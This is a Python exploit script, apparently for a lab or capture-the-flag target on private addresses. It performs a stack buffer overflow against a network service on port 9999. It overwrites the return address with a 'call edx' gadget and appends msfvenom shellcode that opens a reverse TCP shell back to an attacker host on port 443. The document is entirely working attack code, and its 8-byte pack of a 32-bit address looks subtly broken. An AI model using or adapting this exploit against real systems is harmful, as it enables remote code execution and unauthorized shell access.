#!/usr/bin/python3
import sys, socket
from struct import pack 

ip = "192.168.56.101"
port = 9999
buffer_len = 900
offset = 512
junk = b"\x41" * offset

# 08048734: call edx
eip = pack("<Q", 0x08048734)

# â”€$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 -b "\x00\x20\x0a\x0d" -f py
buf =  b""
buf += b"\xdb\xc7\xbe\x04\xc4\x21\x81\xd9\x74\x24\xf4\x58\x29"
buf += b"\xc9\xb1\x12\x83\xc0\x04\x31\x70\x13\x03\x74\xd7\xc3"
buf += b"\x74\x45\x0c\xf4\x94\xf6\xf1\xa8\x30\xfa\x7c\xaf\x75"
buf += b"\x9c\xb3\xb0\xe5\x39\xfc\x8e\xc4\x39\xb5\x89\x2f\x51"
buf += b"\x86\xc2\xe8\xc7\x6e\x11\x09\x06\xd4\x9c\xe8\xb8\x4c"
buf += b"\xcf\xbb\xeb\x23\xec\xb2\xea\x89\x73\x96\x84\x7f\x5b"
buf += b"\x64\x3c\xe8\x8c\xa5\xde\x81\x5b\x5a\x4c\x01\xd5\x7c"
buf += b"\xc0\xae\x28\xfe"
payload = buf

#metasm > sub esp, 0x20
#"\x83\xec\x20"
sub_esp = b"\x83\xec\x20"
buffer = junk + eip + sub_esp + payload 

try:

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send(buffer)
	s.close()
	

except:

	print ("error connecting to server")
	sys.exit()